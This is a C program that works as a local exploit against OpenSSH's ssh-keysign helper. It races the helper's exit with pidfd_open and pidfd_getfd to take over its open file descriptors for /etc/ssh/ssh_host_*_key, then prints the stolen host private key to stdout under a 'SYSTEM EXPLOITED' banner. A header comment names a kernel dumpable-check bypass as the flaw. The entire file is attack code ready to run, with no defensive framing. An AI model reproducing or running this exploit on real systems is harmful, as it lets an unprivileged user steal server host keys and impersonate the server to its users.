/*
 * "It is a fearful thing to fall into the hands of the living God."
 *                                                — Hebrews 10:31
 *
 * ssh-keysign opens /etc/ssh/ssh_host_*_key before permanently_set_uid().
 * Bails out with the fds still open on EnableSSHKeysign=no. Race the
 * exit window with pidfd_getfd. mm-NULL bypasses the dumpable check
 * (kernel/ptrace.c, patched 31e62c2ebbfd 2026-05-14).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

#define C_RESET   "\033[0m"
#define C_GREY    "\033[1;37m"
#define C_YELLOW  "\033[1;93m"
#define C_CYAN    "\033[1;96m"
#define C_GREEN   "\033[1;92m"
#define C_RED     "\033[1;91m"
#define C_MAGENTA "\033[1;95m"

static int pidfd_open(pid_t pid, unsigned f)
{
	return syscall(__NR_pidfd_open, pid, f);
}

static int pidfd_getfd(int pfd, int fd, unsigned f)
{
	return syscall(__NR_pidfd_getfd, pfd, fd, f);
}

static void report_wait_status(const char *label, pid_t pid, int status)
{
	if (WIFEXITED(status))
		fprintf(stderr, C_GREY "%s pid=%d exited status=%d\n" C_RESET, label, pid, WEXITSTATUS(status));
	else if (WIFSIGNALED(status))
		fprintf(stderr, C_GREY "%s pid=%d killed by signal %d\n" C_RESET, label, pid, WTERMSIG(status));
	else if (WIFSTOPPED(status))
		fprintf(stderr, C_GREY "%s pid=%d stopped by signal %d\n" C_RESET, label, pid, WSTOPSIG(status));
}

static const char *PATHS[] = {
	"/usr/libexec/ssh-keysign",
	"/usr/libexec/openssh/ssh-keysign",
	"/usr/lib/ssh/ssh-keysign",
	"/usr/lib/openssh/ssh-keysign",
	NULL,
};

int main(void)
{
	const char *bin = NULL;
	for (int i = 0; PATHS[i]; i++) {
		if (access(PATHS[i], X_OK) == 0) { bin = PATHS[i]; fprintf(stderr, C_GREEN "found: %s\n" C_RESET, bin); break; }
		fprintf(stderr, C_GREY "missing: %s\n" C_RESET, PATHS[i]);
	}
	if (!bin) { fprintf(stderr, C_RED "ssh-keysign not found\n" C_RESET); return 1; }
	fprintf(stderr, C_CYAN "uid=%d  target=%s\n" C_RESET, getuid(), bin);

	for (int round = 0; round < 50; round++) {
		fprintf(stderr, C_YELLOW "\r[round %d/50] forking ssh-keysign ...        " C_RESET, round);
		pid_t c = fork();
		if (c < 0) {
			perror("fork");
			return 1;
		}
		if (c == 0) {
			int dn = open("/dev/null", O_RDWR);
			if (dn < 0) {
				perror("open /dev/null");
				_exit(126);
			}
			if (dup2(dn, 0) < 0 || dup2(dn, 1) < 0 || dup2(dn, 2) < 0) {
				perror("dup2 /dev/null");
				_exit(126);
			}
			if (dn > 2 && close(dn) < 0)
				perror("close /dev/null");
			execl(bin, "ssh-keysign", (char *)NULL);
			perror("execl ssh-keysign");
			_exit(127);
		}

		int pfd = pidfd_open(c, 0);
		if (pfd < 0) {
			perror("pidfd_open");
			int status;
			if (waitpid(c, &status, 0) < 0)
				perror("waitpid");
			else
				report_wait_status("child", c, status);
			continue;
		}
		fprintf(stderr, C_CYAN "\r[round %d/50] pidfd_open ok pfd=%d child_pid=%d  " C_RESET, round, pfd, c);

		int hit = 0;
		for (int a = 0; a < 30000 && !hit; a++) {
			for (int i = 3; i < 32; i++) {
				int s = pidfd_getfd(pfd, i, 0);
				if (s < 0) continue;

				char p[256] = {0}, lk[64];
				snprintf(lk, sizeof(lk), "/proc/self/fd/%d", s);
				ssize_t n = readlink(lk, p, sizeof(p) - 1);
				if (n < 0) {
					perror("readlink");
					close(s);
					continue;
				}
				if (n > 0) p[n] = 0;

				if (strstr(p, "ssh_host_") && strstr(p, "_key")) {
					fprintf(stderr, C_GREEN "\n\n!!! SYSTEM EXPLOITED — stolen fd %d -> %s (round=%d try=%d) !!!\n\n" C_RESET, i, p, round, a);
					char buf[4096];
					if (lseek(s, 0, SEEK_SET) < 0)
						perror("lseek");
					ssize_t k = read(s, buf, sizeof(buf) - 1);
					if (k < 0)
						perror("read");
					else if (k > 0) {
						buf[k] = 0;
						fprintf(stderr, C_GREEN "read %zd bytes — key material follows on stdout\n" C_RESET, k);
						if (fputs(buf, stdout) == EOF)
							perror("fputs");
					} else {
						fprintf(stderr, C_RED "matched fd %d but read returned 0 bytes\n" C_RESET, i);
					}
					close(s);
					hit = 1;
					break;
				}
				if (close(s) < 0)
					perror("close stolen fd");
			}
		}

		if (close(pfd) < 0)
			perror("close pidfd");
		int status;
		if (waitpid(c, &status, 0) < 0)
			perror("waitpid");
		else if (!hit) {
			if (WIFEXITED(status))
				fprintf(stderr, C_GREY "\r[round %d/50] no match  child exited status=%d                " C_RESET, round, WEXITSTATUS(status));
			else if (WIFSIGNALED(status))
				fprintf(stderr, C_GREY "\r[round %d/50] no match  child killed signal=%d                " C_RESET, round, WTERMSIG(status));
		}
		if (hit) return 0;
	}

	fprintf(stderr, C_RED "\n\n!!! EXPLOIT FAILED — system not vulnerable or window too narrow (50 rounds) !!!\n\n" C_RESET);
	return 1;
}
